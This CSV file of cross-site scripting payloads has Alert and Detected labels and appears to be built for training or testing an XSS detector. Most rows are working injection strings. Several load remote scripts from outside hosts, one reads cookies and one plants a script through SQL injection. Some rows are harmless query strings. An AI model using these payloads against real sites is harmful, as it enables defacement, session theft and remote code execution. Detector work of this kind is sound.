Payload,Alert,Detected
"data:text/html;charset=thing;base64,PHNjcmlwdD5hbGVydCgndGVzdDMnKTwvc2NyaXB0Pg",False,0
"<;IMG SRC="";http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode"";>;",False,0
"StartRow=1&MaxRows=50&CD=%3Cfont%20size=7%3EDai<br/>Mon%20Was%20heRe,",False,0
locale=%22%3E%3Ciframe%20src=%22http://xssed.com%22%3E,False,0
"lang=>"">perl -e 'print ""<IMG<br/>SRC=http://img265.imageshack.us/img265/9093/hacklz7.jpg>"";' > out",False,0
"<img src=""mocha:document.vulnerable=true;"">",False,0
&#X00003C;,False,0
hid=durakhat&durak=L0294&durakname=%22%3E%3Cmarquee%3E%3Ch1%3EB<br/>y+St@rExT%3C/h1%3E%3C/marquee%3E,False,0
CNTN_CD=A0001363843&PAGE_CD=N0000&BLCK_NO=3&CMPT_CD=<br/>M0001=%3C/SCRIPT%3E%22%3E%27%3E%3C/SCRIPT%3E%3Ciframe%20src=%22http://xssed.com%22%3E%3C/iframe%3E,False,0
pt=2&vid=1190475784_1X04X1364695966&rpt=2&kt=1,False,0
"<style>:target {transform: rotate(180deg);}</style><bdo id=x style=""transition:transform 2s"" ontransitionrun=print()></bdo>",False,0
click=sok,False,0
page=forums&p=http://www.google.com,False,0
"<style>:target {color: red;}</style><textarea id=x style=""transition:color 10s"" ontransitioncancel=print()></textarea>",False,0
"<style>:target {color: red;}</style><ul id=x style=""transition:color 10s"" ontransitioncancel=print()></ul>",False,0
“autofocus onFocUs=’find(l\u{6F}cati\u{6F}n=`j&Tab;avascr&NewLine;ipt&colon;al&Tab;ert()`)’,False,0
repname=Contest%20Manager&path=%2Fmanager<br/>%2F&search=%22%3E%3Ciframe%20src=http://google.com%3E,False,0
"exp/*<A STYLE='no\:no(""*//*"");",False,0
"_pageid=33,127911&_dad=portal&_schema=PORTAL",False,0
"<xsl:template match=""/"">",False,0
cmd=search&words=%3Cmarquee%3EXSSED_bY_SaMTHG<br/>%3C/marquee%3E&searchWhere=0&mode=normal,False,0
txt_msg=%22%3E%3Ciframe%20width=1000%20height=800%20src<br/>=http://clubhacker.org/foro%3E%3C/iframe%3E,False,0
country=India%3Ch1%3EAgd_Scorp%3C/h1%3E,False,0
<svg%0Ao%00nload=%09((pro\u006dpt))()//,False,0
action=forgot_password,False,0
"PID=358,0,0&LNG=de&SID=5efcd05c51a626f15f38e9bef515a86b&preview=&code=",False,0
t=c&mid=111&uid=222&&&http://www.xssed.org?utm_medium=email&utm_campaign=anp<br/>3&utm_source=anp3&utm_medium=email&utm_content=unspecified&utm_campaign=110725_sommartavling,False,0
"<style>:target {color: red;}</style><rt id=x style=""transition:color 10s"" ontransitioncancel=print()></rt>",False,0
abc=%22%3E%3Ciframe%20src=http://xssed.com%20/%3E,False,0
lid=de&tid=modern_blue&f_user=&six=&f_email==%22%3E%3Ch1%3E<br/>Null%20Code%20Services%3C/h1%3E=%22%3E%3Ciframe%20src=http://www.google.com/%3E%3C/iframe%3E,False,0
lang=es=%22%3E%3Ch1%3EExploit%20Some%20XSS%3C/h1<br/>%3E=%22%3E%3Ciframe%20src=http://www.google.com/%3E%3C/iframe%3E,False,0
nats=%22%3E%3Ciframe%20src=http://pc-<br/>kopat.us/hacked/%3E,False,0
query=%27%22%3E%3E%3Cmarquee%3E%3Ch1%3E%3Cstrong%3E%3Ci%3Ecueb<br/>allr%3C%2Fi%3E%3C%2Fstrong%3E%3C%2Fh1%3E%3C%2Fmarquee%3E,False,0
highlight=3&anav=02_Akt%20und%20Skulptur&bnav=04_Jani&ima<br/>ge=6378671_tn.jpg&count=6&skin='%22%3E%3Ciframe%20src=http://pc-kopat.us/hacked/%3E,False,0
"<input autofocus ng-focus=""$event.composedPath()|orderBy:'[].constructor.from([1],alert)'"">",False,0
option=com_content&user_rating=1&submit_vote=index2.php?opti<br/>on=com_content&user_rating=1&submit_vote=%E8%A9%95%E4%BE%A1&task=vote&pop=0&Itemid=10&cid=1&url=http<br/>://www.xssed.com,False,0
"errorLogin=<marquee><font<br/>size=""7"">LeBaNeSe-XsSeR</font></marquee>",False,0
searchword=&prepage=10&keyword=%22%3E%3Ciframe+src%3Dhttp%3A%2F%2F127.0.<br/>0.1%2F%3E%3C%2Fiframe%3E&channelid=3006&submit=%E6%90%9C%E7%B4%A2,False,0
main=http://www.xssed.com,False,0
"<svg><use href=""data:image/svg+xml;base64,PHN2ZyBpZD0neCcgeG1sbnM9J2h0dHA6Ly93d3cudzMub3JnLzIwMDAvc3ZnJyB4bWxuczp4bGluaz0naHR0cDovL3d3dy53My5vcmcvMTk5OS94bGluaycgd2lkdGg9JzEwMCcgaGVpZ2h0PScxMDAnPgo8aW1hZ2UgaHJlZj0iMSIgb25lcnJvcj0iYWxlcnQoMSkiIC8+Cjwvc3ZnPg==hashtag#x"" /></svg>",False,0
&lt;STYLE&gt;BODY{-moz-binding:url(&quot;http://ha.ckers.org/xssmoz.xml#xss&quot;)}&lt;/STYLE&gt;,False,0
&LT;,False,0
"<style>:target {color: red;}</style><kbd id=x style=""transition:color 10s"" ontransitioncancel=print()></kbd>",False,0
c=33&cadena_busqueda=%22%3E%3Ch1%3E%3Cmarquee%3EXSS,False,0
page=new_account&server=6&action=validate&ref=,False,0
lid=ch&tid=modern_blue&f_user=&six=&f_email<br/>==%22%3E%3Ch1%3ENull%20Code%20Services%3C/h1%3E=%22%3E%3Ciframe%20src=http://www.google.com/%3E%3C/i<br/>frame%3E,False,0
"act=cpage&id='""></script><iframe/src=http://site.mynet.c<br/>om/serhat_man/index.php><h1>Hack",False,0
pg=kerko,False,0
"kala=""%22%3E%3Ciframe%20src=http://hypnozhack.org/hacked/%3E",False,0
"<style>:target {transform: rotate(180deg);}</style><nav id=x style=""transition:transform 2s"" ontransitionrun=print()></nav>",False,0
"id=1221591&w=1'""><h1>XSS",False,0
"lid=12&tid=2&f_user=&six=&f_email==""><h1>Null<br/>Code Services</h1>=""><iframe%20src=http://www.google.com/></iframe>",False,0
oncanplaythrough,False,0
pid=3234490&chid=8%22%3E%3Ciframe%20src=http://www.xssed.com%3E,False,0
[][“\146\151\154\164\145\162”][“\143\157\156\163\164\162\165\143\164\157\162”](“\145\166\141\154\50\141\164\157\142\50\42\131\127\170\154\143\156\121\157\115\123\153\75\42\51\51”)(),False,0
option=com_content&user_rating=1&submit_vote=index2.php?option=com_cont<br/>ent&user_rating=1&submit_vote=%E8%A9%95%E4%BE%A1&task=vote&pop=0&Itemid=10&cid=1&url=http://r3t.n3t.<br/>nl,False,0
_nfpb=true&_pageLabel=research_<br/>searchOrBrowseResults&basicSearchOrBrowseControllerPortlet_resultsPage_actionOverride=/portlets/basi<br/>cSearchOrBrowse/basicSearchOrBrowseAction&_nfls=false,False,0
showday=1&f_subject=&m_typ='%22%3E%3Ch1%3ERubberDuc<br/>k%3C/h1%3E%3Cbr%3E%3Cbr%3E%3Cmarquee%3EWhiteHat%20Forever%3C/marquee%3E&m_id=&f_startdate=11-04-2007<br/>&f_enddate=11-04-2007,False,0
action=register,False,0
<h1/%6f%6e/oNclicK=alert``>AnonKryptiQuz,False,0
<D3/OnpOinTeReENter=confirm``>click here,False,0
a_id=74,False,0
m=1&s=%22%3E%3Ch1%3EXSS%20Here%21%20%3C/h1%3E,False,0
action=missionary.info%3Cmarquee%3EPaPPy%3C/marquee%3E&missi<br/>onary_id=69,False,0
OrderNr=x%22%3E%3Cimg%20src=%22http://s5.tinypic.com/2pzcgty.jpg%22%3E,False,0
"<iframe/src=data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=></iframe>",False,0
archive=<h1><marquee>ownz%20by%20ertuqrul,False,0
</div>,False,0
onpause,False,0
searchkey=%3Ciframe%20src=http://www.google.com%3E%3C/iframe%3E,False,0
siteToSearch=cisco.com&searchPhrase=what+is+xss'%20st<br/>yle=-moz-binding:url(http://tulipandrose.net/zdefter/conda.xml%23conda)%22%3E%20&country=%22'%3C%3E&<br/>language=%3C%3E%22'&filter=%22'%3C%3E&search=Search,False,0
"<style>:target {transform: rotate(180deg);}</style><button id=x style=""transition:transform 2s"" ontransitionrun=print()></button>",False,0
site=cablegear&siteid=1&bys=key,False,0
EVENT=login&PHPSESSID=42%22%3E%3Cimg%20src=%22http://s5.tinypic<br/>.com/2pzcgty.jpg%22%3E%3C/img%3E,False,0
l=http://www.xssed.com,False,0
keyword=%22%3EUber0n%20says%20%3Ch1%3Ew00<br/>t%3Ciframe%20src=%22http://uber0n.darkillusion.org/xsspage.htm%22%3E&s2=direct&project=gateway&selec<br/>tion=gen&selection=opac&selection=web&searchbutton=Go,False,0
bannerid=658&zoneid=84&source=&dest=http://lht.by.ru/uyar1.htm<br/>l,False,0
http://www.xssed.com/archive/author=Azat%20Harutyunyan/,False,0
s=52b510e884372d5598666899a64cad4e,False,0
o=modules&n=search&f=search,False,0
draw=%3Ciframe+src%3Dhttp%3A%2F%2Fgoogle.com%3E%3C%2F<br/>iframe%3E,False,0
url=xssed.com&frame=on&lang=c&zone=575,False,0
onStart,False,0
categoryid=5&p6_action=mailform,False,0
sid=%27%22%3E%3Cmarquee%3EXSS%20by%20SylTroX,False,0
"b=""URL(\"""";",False,0
d=pne.telia.com,False,0
<x onauxclick=import('//1152848220/')>click,False,0
"keywords=""><iframe src=""xssed.com"">",False,0
"a=\""get\"";",False,0
email='%22%3E%3Ciframe%20src=http://xssed.com%3E&password=&passw<br/>ord_r=&username=&month=&date=&year=&country=&gender=&submit=submit,False,0
keyword=%3E%3E%3Cmarquee%3E%3Ch1%3E<br/>YAY+INTERNET+SECURITY+BY+CHEROKEE+WARRIOR%3C%2Fh1%3E%3C%2Fmarquee%3E&submit.x=0&submit.y=0,False,0
id=By_kusomiso.com&u=http://kusomiso.com,False,0
url=%22%3E%3Ciframe%20src%3D%2F%3E%3C%2Fiframe%3E,False,0
"-->'""/></sCript><svG x="">"" onload=(co\u006efirm)``>",False,0
PageId=http://www.google.com,False,0
navigator.vibrate(500),False,0
option=com_content&user_rating=1&submit_vote=index2.php?option=co<br/>m_content&user_rating=1&submit_vote=x&task=vote&pop=0&Itemid=10&cid=1&url=http://xssed.com,False,0
theme=notrefamille&service=forum<br/>&redirect=%22%3E%3Clink%20href=http://starext.by.ru/css.css%20type=text/css%20rel=stylesheet%3E,False,0
op=modload&name=Buscador&file=buscar&l_op=search,False,0
"<object data=%22data:text/html;base64,PHNjcmlwdD4gdmFyIHhociA9IG5ldyBYTUxIdHRwUmVxdWVzdCgpOyB4aHIub3BlbignR0VUJywgJ2h0dHA6Ly94c3NtZS5odG1sNXNlYy5vcmcveHNzbWUyJywgdHJ1ZSk7IHhoci5vbmxvYWQgPSBmdW5jdGlvbigpIHsgYWxlcnQoeGhyLnJlc3BvbnNlVGV4dC5tYXRjaCgvY29va2llID0gJyguKj8pJy8pWzFdKSB9OyB4aHIuc2VuZCgpOyA8L3NjcmlwdD4=%22>",False,0
page=90&kode=6&ktg=XSSED%3C/h3%3E%3Ciframe%20width=%22625%22%20height=%22800<br/>%22%20src=%22http://www.spyrozone.net%22%3E%3C/iframe%3E%3Cbr%3E%3Cbr%3E%3Ch3%20class=%22judulcob%22<br/>%3ELink:%20Lain-Lain,False,0
"document.getElementsByClassName(""example"")",False,0
RID=4532&TID=103&URL=http%3A//THESHOCKBOY.tr.cx&CookieEnabled=tr<br/>ue,False,0
query=%3Ch1%3EHacked+By+Hack-Labs%3Cimg+src%3Dhttp%3A%2F%2Fimg368.ima<br/>geshack.us%2Fimg368%2F9916%2F2796bo2.png%3E%3C%2Fh1%3E&www=true,False,0
url=http://67.52.216.216/&reason=Anonymizer/'%3E%22%3E%3CSCRI<br/>PT/SRC=http://kusomiso.com/xss.js%3E%3C/SCRIPT%3E,False,0
Page=gb,False,0
ct_func=&t_name=&menu1=&f_search_option=all&f_search_word=%3Csc<br/>ript%20src=http%3A%2F%2Fkusomiso.com%2Fxss.js%3E,False,0
q=%27%22%3E%3Ch1%3ERubberDuck%3C%2Fh1%3E%3Cbr%3E%3Cbr%3E%3Cma<br/>rquee%3EWhiteHat+Forever%3C%2Fmarque%3E&near=21209,False,0
location=professionallinks&nexturl=http://www.xssed.com,False,0
"<style>:target {transform: rotate(180deg);}</style><code id=x style=""transition:transform 2s"" ontransitionrun=print()></code>",False,0
BannerID=649&url=http://www.xssed.com,False,0
Search=%3Cbr%2F%3E%3Cbr%2F%3E%3Cmarquee%3EThis+website+i<br/>s+vulnerable+to+xssing!%3C%2Fmarquee%3E%3Cbr%2F%3E%3Cbr%2F%3E%0D%0A,False,0
txtsearch=%22%3E%3Cmarquee%3E%3Ch1%3EDefaced%20by%20i<br/>ronzorg%3C/h1%3E%3C/marquee%3E,False,0
"page=companies&id=1446&name=""><iframe%20src=http://hot<br/>turks.org/>",False,0
ccbill='%22%3E%3Ciframe%20src=http://pc-kopat.us/hack<br/>ed/%3E,False,0
queryStr=%22%3E%3Cstyle%3Ebody{background:red!important}%3C/sty<br/>le%3E%3Ciframe%20src=%22http://xssed.com%22%20width=755%20height=1550%20frameborder=0%20style=positi<br/>on:absolute;top:0;left:0;z-index:1000;%3E%3C/iframe%3E,False,0
m_LO=1&m_PR=17&m_CBURL=http://uber0n.darkillusion.org/xsspag<br/>e.htm,False,0
search=k&keyword=%22%3E%3Cimg%20src=http://solastyear.com/boxerow<br/>ned.jpg%3E%3Cbr%3E%3Ch1%3EOWNED%20N00B!%3C/h1%3E,False,0
onbeforeunload,False,0
act=inscription&email=%22%3E%3Cmarquee%3E%3Ch1%3EDefaced+by+ironzorg<br/>%3C%2Fh1%3E%3C%2Fmarquee%3E&x=17&y=10,False,0
"id=-99999+union+all+select+1,2,0x3c736372697074207372633d2268<br/>7474703a2f2f66726565776562732e636f6d2f736b756e6b663030742f582e6a73223e3c2f7363726970743e,4,5,6,7,8,9<br/>,10,11+from+wfsj_basiccontent--",False,0
q=__22__3E__3Ciframe-src__3D__22http__3A__2F__2Fxssed.com__22__3E&c<br/>y=de,False,0
<!-- FF 14+ -->,False,0
domain=%22%3E%3Cmarquee%3E%3Ch1%3EDefaced+by+ironzorg<br/>%3C%2Fh1%3E%3C%2Fmarquee%3E,False,0
href=http://insecurity.ro,False,0
"data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTJyk8L3NjcmlwdD4K",False,0
topic=antrag,False,0
fuseaction=user.viewprofile&friendID=178878661,False,0
id=82&cat=%22%3E%3Cimg%20src=%22http://img179.imageshack.u<br/>s/img179/2251/xsscccee3.jpg%22/%3E,False,0
pagina=http://google.com?,False,0
iframe=lightsinger.org/jaihind.html,False,0
REF='%3E%3Ciframe%20src=http://google.com%3E,False,0
page=pp_productos.php&tipo=4&md=1,False,0
"<dETAILS%0aopen%0aonToGgle%0a=%0aa=prompt,a() x>",False,0
siteharitasi=%2E%2E%2Farabic%2Fdefault%2Easp&ara=%3C<br/>IMG%20SRC=%22http://www.loadtr.com/b-236940-d.jpg%22%3E,False,0
ref=%22--%3E%3Ciframe%20src=http://www.xssed.com%3E,False,0
tag=%22%3E%3Cmarquee%3EXSSed%3C/marquee%3E,False,0
"<A HREF=""htt p://6 6.000146.0x7.147/"">AnonKryptiQuz</A>",False,0
onkeyup,False,0
KONTO=%22%3E%3Ciframe%20src=http://www.google<br/>.de%3E,False,0
login=fail&email=%22%3E%3Ch1%3EDarkMindZ.com%3Chidden%20type=%22,False,0
"nedir=<img src=""http://img61.imageshack.us/img61/4632/26vrul2.jpg"">",False,0
pcon=newacc,False,0
';self['ale'+'rt'](self['doc'+'ument']['dom'+'ain']);//,False,0
gsfn=%22%3E%3Cmarquee%3EDEFACED+BY+SPONSFULL%3C%2Fmarquee%3E&gsln<br/>=%22%3E%3Cmarquee%3EDEFACED+BY+SPONSFULL%3C%2Fmarquee%3E&state=&query=%2B%22%3E%3Cmarquee%3EDEFACED+<br/>BY+SPONSFULL%3C%2Fmarquee%3E+%22%3E%3Cmarquee%3EDEFACED+BY+SPONSFULL%3C%2Fmarquee%3E&collection=-1&b<br/>c=All&xid=87&links=0&kbid=1031&sub=SF20080613,False,0
mtr=http://xssed.com,False,0
<input onblur=write(AnonKryptiQuz) autofocus><input autofocus>,False,0
onDataSetChanged,False,0
<x onauxclick=import('//xss/')>click,False,0
term=%22%3E%3Ciframe%20src=http://xssed.com%3E&commit=Search,False,0
onfullscreenchange,False,0
clickedItemURN=http://r3t.n3t.nl,False,0
textArea=''></script><h1>HackedByCiCoSz</h1>,False,0
sid=e42f4bfd67a8003683de7f57442440ec&tid=default&lid=es<br/>&error=-ERR+Login+failed.%0D%0A=%22%3E%3Ch1%3ENull%20Code%20Services%3C/h1%3E=%22%3E%3Ciframe%20src=<br/>http://www.google.com/%3E%3C/iframe%3E,False,0
oaparams=2__bannerid=1103__zoneid=7__cb=7338e327d6__oadest=h<br/>ttp://insecurity.ro,False,0
t_query=QN&titulo=%22%3E%3Ch1%3EXss+by+n0b0dy%3C%2Fh1%3E&auto<br/>r=%22%3E%3Ch1%3EXss+by+n0b0dy%3C%2Fh1%3E&descripcion=%22%3E%3Ch1%3EXss+by+n0b0dy%3C%2Fh1%3E&buscar_l<br/>ibro=Buscar+Libros,False,0
enc=a90bdb1cea7a71f85529a3631a89dc4afc1fb75a773eed8e7b09cf0059c0b994d2<br/>2f8467c3d29625193b330604370c9ddd17055ef0bd270ccd5265c5d239b883ce8e0af235e28c9f84801235aae78990f4b10b<br/>a00b8ecdfd342ed824855e308a361b563ddc1fad-064c897302777ee0078ac3a6c30df74c,False,0
gate=,False,0
"history=1&Page=test""></a><iframe src=""http://xssed.com"">//",False,0
['script'](2),False,0
msgid=230355,False,0
http://example.com,False,0
IDLang=1,False,0
txtsearch=%3Cmarquee%3EXSS%20Vulnerability%20Found%20by%20viperfx<br/>%3C/marquee%3E&Submit=%3A%3A+Search+%3A%3A,False,0
"forgotPasswordUsername=<iframe<br/>style=""position:absolute;left:0;top:0;z-index:9999"" src=""http://www.xssed.com/"" width=100%25<br/>height=4000 frameborder=0 scroll=no></iframe>",False,0
onPopState,False,0
"<div style=""background:url(/f#&#127;oo/;color:red/*/foo.jpg);"">X",False,0
cx[][][][][][][][][][][][][][][][][][][][][][<br/>][][][][][][][][][][][][][][][]=%3Cscript%20src=http://hiphopshare.xm.com/xss.js,False,0
action=unpw,False,0
click=1&cid=adv165x240&go=http://xssed.com,False,0
msg=%3Ciframe%20src=%22http://xssed.com%22%3E&PHPSESSID=d7oiofjg<br/>4kh2gde8s9uot5r9t3,False,0
r=xssed.com,False,0
language='%22%3E%3Ch1%3ERubberDuck%3C/h1%3E%3Cbr%20/%3E%3Ch2%3E%3C<br/>marquee%3EWhiteHat%20Forever%3C/marquee%3E%3C/h2%3E,False,0
xpid=INE&xpgid=ine_publicacoes,False,0
"textArea=<iframe%20src=""http://xssed.com/archive/a<br/>uthor=TurKPoweR/"">",False,0
"do=upload&error=<center><font size=""50"">XSSed BY HOLLYWOOD</font</center>",False,0
id=%3E%22%3E%3Ciframe%20src=%22http://xssed.com%22%3E,False,0
event=likeness-templatized-y&url=http%3A%2F%2Fwww.xssed.com,False,0
service=mail&rm=false&continue=http%3A%2F%2Fmail.google<br/>.com%2Fmail%2F%3Fui%3Dhtml%26zy%3Dl&ltmpl=default&ltmplcache=2&passive=truel,False,0
"<svg:circle cx=""0.45"" cy=""0.7"" r=""0.075"" fill=""white""/>",False,0
nats=%22%3E%3Ciframe%20src=http://pc-kopat.us/hacked<br/>/%3E,False,0
%3balert`AnonKryptiQuz`%3b,False,0
url=http://xssed.com/&param=mdcXCbNn16Y1YXsHweri0dsknLLD<br/>FaoCBSHV8UJobkWkXa0jDVSvorc3oBkHg5Q_nw1qr42nR6Cok8oP_-vGTN24qBzCOIrA_GyPMpINo5vOFPU&cli=TW96aWxsYXxO<br/>ZXRzY2FwZXw1LjAgKFdpbmRvd3M7IGVuLVVTKXwyMDA5MDcyOTIyNTAyN3x0cnVlfDczfFdpbmRvd3MgTlQgNS4xfHx8V2luMzJ8<br/>MTZ8R2Vja298MjAwOTA3Mjl8fHxNb3ppbGxhLzUuMCAoV2luZG93czsgVTsgV2luZG93cyBOVCA1LjE7IGVuLVVTOyBydjoxLjku<br/>MS4yKSBHZWNrby8yMDA5MDcyOSBGaXJlZm94LzMuNS4yfHxmYWxzZXx8fGVuLVVTfDIsMHwzMnwxMjgwfDEwMjQA&mo=9,False,0
"ID=""><FONT%20SizE=""1000"">XSS-THE-SH0CK-B0Y</font>",False,0
dest=http://xssed.com,False,0
id=10985%22%3E%3Ciframe%20src=http://turkhackeriz.com/%3E,False,0
search_string=%3Cimg+src%3D%22http%3A%2F%2Fi243.photobucket<br/>.com%2Falbums%2Fff50%2Fdolop_ghani%2Fshit.jpg%22%3E&match_whole_words=on,False,0
ImgTrack=&region=&go=true&CATEGORIE=-1&curCat=auto&prix_mi<br/>ni=&prix_maxi=&SS_CATEGORIE=388&marque=%27%22%3E%3Cmarquee%3EXSS%20by%20syltrox%3Ciframe%20src=%27ht<br/>tp://google.com%27/%3E&modele=&prix=,False,0
"<style>:target {color: red;}</style><div id=x style=""transition:color 10s"" ontransitioncancel=print()></div>",False,0
tab=ci&content=frame&url=www.xssed.com,False,0
id=30%22%3E%3Ciframe%20src=http://xssed.com%3E%3Ca%20href=%22x<br/>ssed.com,False,0
file=http://www.googlebig.com,False,0
find=%3Ciframe%20src=%22http://xssed.com%22%3E,False,0
"browserName=<marquee><font size=""5""<br/>color=""red"">LeBaNeSe-XsSeR</font></marquee>",False,0
glbSearch=&SearchType=free&auspiSearch=&pe<br/>riodoSearch=%3Ch1%3EA%20BIG%20and%20fikin%20easy%20XSS!%3Cbr%3E%3Cbr%3Eby%20C1c4Tr1Z..%3C/h1%3E%3Cif<br/>rame%20src=http://xssed.com/%3E%3C/iframe%3E&Proyectos=true&tipoSearch=&tramiteSearch=&PRODeDia=&PRO<br/>DeMes=&PRODeAnio=&PROHastaDia=1&PROHastaMes=5&PROHastaAnio=2008&AutSancion=&AutTipo=&AutRegOfi=&AutD<br/>eDia=&AutDeMes=&AutDeAnio=&AutHastaDia=1&AutHastaMes=5&AutHastaAnio=2008&ActNumero=&ACTOrganismo=&AC<br/>TDeDia=&ACTDeMes=&ACTDeAnio=&ACTHastaDia=1&ACTHastaMes=5&ACTHastaAnio=2008,False,0
onseeking,False,0
"<a id=""x""><rect fill=""white"" width=""1000"" height=""1000""/></a>",False,0
id=12,False,0
fuseaction=search.newsearch,False,0
cat_id=10&sub_cat=216&Title=<img%20src=http://cy<br/>ber-raider.com/yenisi.JPG>,False,0
<!-- IE 10 in IE5-9 Standards mode -->,False,0
go=%22%3E%3Ciframe%20src=http://pc-kopat.us/hacked/%3E,False,0
page=main&tracking=hotlistpromo&url=http%3a%2f%2fr3t%2en3t%2enl,False,0
c=login,False,0
strecke=la&detail=zielgebiet&personen=&abflugha<br/>fen=-1&ziel=-1&shotel=42%22%3E%3Cul%3E%3Cli%20style=list-style:url(http://s5.tinypic.com/2pzcgty.jpg<br/>)%3E&termin=11.02.2009&ruecktermin=21.02.2009&dauer=-1&kategorie=-1&verpflegung=-1,False,0
url=http://www.r3t.n3t.nl/partner/hi5_entry.php%3FWidget%3Df<br/>unnotes&str=y-DXCfautMo2V1qtSMgcUT7wgO9WdDXQSTAnlDkW_rNWHf-P54FeA4utkeKax7AiM9wjYtyYXrzgEnc_KyCF4EA9<br/>16zh2cQ4VV72IQokpDggU9swLpPnd0YUuYZ567Ivol4Na5sNd9w__jY7csE5f4A9E0FEYicDLWjme7ao3mo.&callback=www.r3<br/>t.n3t.nl%2Ffriend%2Fprofile%2FdisplaySameProfile.do%3FaddedWidget%3Dtrue,False,0
"document.getelementbyid(""div1"").innerhtml;</script>",False,0
"<EMBED SRC=""data:image/svg+xml;base64,PHN2ZyB4bWxuczpzdmc9Imh0dH A6Ly93d3cudzMub3JnLzIwMDAvc3ZnIiB4bWxucz0iaHR0cDovL3d3dy53My5vcmcv MjAwMC9zdmciIHhtbG5zOnhsaW5rPSJodHRwOi8vd3d3LnczLm9yZy8xOTk5L3hs aW5rIiB2ZXJzaW9uPSIxLjAiIHg9IjAiIHk9IjAiIHdpZHRoPSIxOTQiIGhlaWdodD0iMjAw IiBpZD0ieHNzIj48c2NyaXB0IHR5cGU9InRleHQvZWNtYXNjcmlwdCI+YWxlcnQoIlh TUyIpOzwvc2NyaXB0Pjwvc3ZnPg=="" type=""image/svg+xml"" AllowScriptAccess=""always""></EMBED>",False,0
onload=prompt`AnonKryptiQuz`>,False,0
si=8<br/>3Ezl.1jQAhz.3l5Xev.2H*,False,0
file=http://elredtuning.altervista.org,False,0
searchQuery=%3E%3E%3Cmarquee%3E%3Ch1%3EYAY%20INTERNET%20SECURI<br/>TY%20BY%20CHEROKEE%20WARRIOR%3C/h1%3E%3C/marquee%3E,False,0
messageID=10129207,False,0
Msg=%3Ciframe%20src=%22http://xssed.com%22%3E,False,0
p=unsubscribe,False,0
lang=es=%22%3E%3Ciframe%20src=http://www.google.com/%3E%3C/ifra<br/>me%3E,False,0
keyword=%3C/title%3E%3Ciframe%20src=http://xssed.com%3E%3C/ifr<br/>ame%3E&kwtype=0&GO=GO,False,0
Produk=<iframe src=http://xssed.com<br/>/>,False,0
"<style>:target {color: red;}</style><noframes id=x style=""transition:color 10s"" ontransitioncancel=print()></noframes>",False,0
login=%22%3E%3Ciframe%20src=http://hypnozhack.org/hacked/<br/>%3E,False,0
c=98390&p=irol-newsArticle&ID=1136684&highlight=%22%3Etestic<br/>les%3C/a%3Etest%3Cmarquee%3EPaPPy was here%3C/marquee%3E,False,0
search_type=site&top_search_field=%22%3E%3Ciframe+src%3D%22h<br/>ttp%3A%2F%2Fxssed.com%22%3E&sm=&srm=&startIndex=0&currentPage=1,False,0
&lt;!--[if gte IE 4]&gt;,False,0
onresize,False,0
"query=&page=""><img%20src=""http://img251.imageshack.us/img251/9587/tu<br/>rk1mf6.gif"">",False,0
sort=pertinence,False,0
"<style>:target {transform: rotate(180deg);}</style><animatemotion id=x style=""transition:transform 2s"" ontransitionrun=print()></animatemotion>",False,0
newsId=636&isgulg=1%22%3E%3Cbody%20background=%22http:<br/>//www.lenagold.ru/fon/ani/cat/ser/sercat67.jpg%22%3E%22%22%3Ciframe%20src=%22http://xssed.com%22%3E,False,0
id=20&mode=individual&no=3'%3E%22%3E%3CSCRIP<br/>T/SRC=http://kusomiso.com/xss.js%3E%3C/SCRIPT%3E&eid=1275,False,0
clickTag=http://lotion.<br/>110mb.com,False,0
"<div style=""font-family:'foo&#10;;color:red;';"">XXX",False,0
seccion=capitulo&idcapitulo=36,False,0
http://www.bg.org.tr,False,0
newnames-to=yhst-63946550236558&continue-url=http%3A%2F%2Fww<br/>w.xssed.com%2F&name=No+One&email=foo@bar.com&x=26&y=19,False,0
name=%3Ciframe%20src=%22http://www.xssed.com/%22%3E&type=fi<br/>rst&gender=male,False,0
"<svg><script xlink:href=data&colon;,window.open('https://www.google.com/') </script",False,0
"<style>:target {color: red;}</style><aside id=x style=""transition:color 10s"" ontransitioncancel=print()></aside>",False,0
ID=226&Link=http://www.google.com,False,0
%3ffuseaction=user.viewfriends&frien<br/>dID=6221,False,0
cx[][][][][][][][][][][][][][][][][][][][][][][][][][][]<br/>[][][][][][][][][][]=%3Cscript%20src=http://hiphopshare.xm.com/xss.js,False,0
msg=%3Cimg%20src=http://i44.tinypic.com/wvbwar.j<br/>pg%3E,False,0
url=http://starext.by.ru/s.html,False,0
"state=<iframe<br/>src=""http://xssed.com"">",False,0
"<style>:target {color: red;}</style><table id=x style=""transition:color 10s"" ontransitioncancel=print()></table>",False,0
